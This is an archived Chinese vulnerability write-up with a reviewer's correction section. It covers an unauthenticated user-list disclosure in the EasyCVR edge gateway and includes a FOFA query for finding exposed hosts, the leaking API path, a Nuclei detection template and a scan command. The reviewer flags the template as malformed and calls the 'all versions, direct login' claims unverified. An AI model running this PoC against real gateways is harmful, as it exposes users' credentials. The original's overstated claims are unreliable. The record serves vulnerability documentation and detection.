---
source: "MrWQ/vulnerability-paper"
id: "vw-dee622e819c86ac756ea9867"
entity_id: "ve-dee622e819c86ac756ea9867"
schema_version: "1"
title: "【1day】EasyCVR 智能边缘网关用户信息泄漏漏洞（附 POC）"
product: "EasyCVR视频平台/智能边缘网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称匿名且全版本；无实测版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/1day%20EasyCVR%20%E6%99%BA%E8%83%BD%E8%BE%B9%E7%BC%98%E7%BD%91%E5%85%B3%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84%20POC%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/-owM80dIHLcfEoVONqMbsQ"
source_status: "recorded"
previous_fofa_unverified: "搜索语句"
fofa: "title=\"EasyCVR\""
---

# 【1day】EasyCVR 智能边缘网关用户信息泄漏漏洞（附 POC）

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：EasyCVR视频平台/智能边缘网关
- 本文讨论：api/v1/userlist账号与MD5泄露
- 版本、权限与配置前提：声称匿名且全版本；无实测版本
- 资料类型：凭据泄露PoC/Nuclei；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 全版本无证据，MD5在线解密不保证得到密码，直接登录表述过强
- 双引号YAML路径反斜杠加花括号为无效转义，模板不可直接解析；veified拼字错误
- 匹配通用ID/Username/Password字段不校验敏感值，作者也提示格式问题
- fofa字段为搜索语句占位，实际title完整
- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“\{”改为“{”；“\}”改为“}”；“veified: true”改为“verified: true”；“Password字段为密码的MD5值，在线解密即可直接登陆后台”改为“Password 字段被原文描述为 MD5 摘要；MD5 不能可逆解密，候选密码比对也不保证恢复明文。不要把真实摘要提交第三方在线服务；登录能力须单独验证”；残缺指纹退出可执行索引并保留原值。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 认证/版本范围和MD5可复用性待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-owM80dIHLcfEoVONqMbsQ)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

EasyCVR 智能边缘网关 userlist 信息泄漏漏洞

02

—  

漏洞影响

全版本

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfial35Fxgv8oWsJY4qt17WzGsBdtLp267Wnia9W4kbZ2xj9icf4djfTYCxQ/640?wx_fmt=png)

03

—  

漏洞描述

EasyCVR 智能边缘网关是一种基于边缘计算和人工智能技术的设备，旨在提供高效的视频监控和智能分析解决方案。它结合了视频监控摄像头、计算能力和网络连接，能够在现场进行视频数据处理和分析，减轻对中心服务器的依赖。EasyCVR 智能边缘网关存在 userlist 信息泄漏，攻击者可以直接登录后台，进行非法操作。

04

—  

资产 FOFA 搜索语句

  

```
title="EasyCVR"

```

05

—  

漏洞复现

poc 如下

```
/api/v1/userlist?pageindex=0&pagesize=10

```

直接使用浏览器访问该接口即可看到敏感信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfianB52xhP945dicrib85M2LrVAdqt5ick1We5jIPspRx4aweTSqbJmEooJg/640?wx_fmt=png)

```
Username字段为用户名，

```

```
Password 字段被原文描述为 MD5 摘要；MD5 不能可逆解密，候选密码比对也不保证恢复明文。不要把真实摘要提交第三方在线服务；登录能力须单独验证

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfiatqI0gpujBz2y7o1L8CdVTY9fgDQywa2eayib439ZfyzialG88ar7udgg/640?wx_fmt=png)

06

—  

nuclei poc

```
id: easycvr-userlist-disclosure
info:
  name: EasyCVR智能边缘网关userlist信息泄漏漏洞
  author: fgz
  severity: high
  reference:
    - none
  metadata:
    fofa-query: title="EasyCVR"
    veified: true
  tags: EasyCVR
http:
  - method: GET
    path:
      - "\{\{BaseURL\}\}/api/v1/userlist?pageindex=0&pagesize=10"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'ID'
          - 'Username'
          - 'Password'
        condition: and

```

公众号复制代码可能格式有问题，nuclei poc 已上传网盘，后台回复 0007 免费获取

单个目标扫描

```
.\nuclei.exe -t .\easycvr-userlist-disclosure.yaml -u http://x.x.x.x:18000/ -me ttt

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfiak8geuaic2jeznsgDHz1Gh5LNqljIShL3VzFw9TzRj2UAOKT5AUdzQCQ/640?wx_fmt=png)

07

—  

修复建议

限制该接口访问权限

08

—  

关注我们

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
